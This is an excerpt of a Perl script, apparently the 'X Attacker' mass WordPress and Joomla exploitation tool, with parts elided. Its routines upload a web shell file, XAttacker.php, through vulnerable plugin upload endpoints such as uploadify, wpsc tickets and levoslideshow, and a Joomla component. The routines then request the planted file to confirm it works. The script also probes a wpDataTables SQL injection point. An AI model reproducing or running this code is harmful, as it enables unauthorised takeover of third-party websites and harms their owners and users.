...
sub banner() {
system("title X Attacker v3.0 Remade ");
...
print color('reset');
print "       ";
print colored ("[ X Attacker v3.0 Remade ]",'red on_black');  
print colored ("[ Coded By Mohamed Riahi, & Remade By N.. ]\n",'red on_black');
print "                     ";
print colored ("[ Start At $datetime ]",'red on_black '),"\n\n";
}
banner();
GetOptions(
    "l|list=s" => \$list,
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
$addblockup="$site/wp-content/Attacker.php?X=Attacker";
...
sub uploadify(){
my $urls = "$site/wp-content/plugins/uploader/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
$addblockup="$site/wp-content/uploads/Attacker.php?X=Attacker";
my $checkaddblock = $ua->get("$addblockup")->content;
...
sub ffg(){
my $urls = "$site/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=rb_upload_file";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
$addblockup="$site/wp-content/uploads/wpsc/XAttacker.php?X=Attacker";
my $checkaddblock = $ua->get("$addblockup")->content;
...
##################Stuff#####################
sub buttplugs(){
my $urls = "$site/wp-content/plugins/wp-levoslideshow/js/swfupload/js/upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
$addblockup="$site/wp-content/uploads/levoslideshow/XAttacker.php?X=Attacker";
my $checkaddblock = $ua->get("$addblockup")->content;
...
###############AUDEAHBLACKACHO###################
sub sqlitest(){
my $sqlitesterurl = "$site/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1";
...
sub hoom(){
my $url = "$site/index.php?index.php?option=com_jimtawl&view=upload&task=upload&pop=true&tmpl=component";
my $shell ="XAttacker.php";
my $field_name = "Filedata";
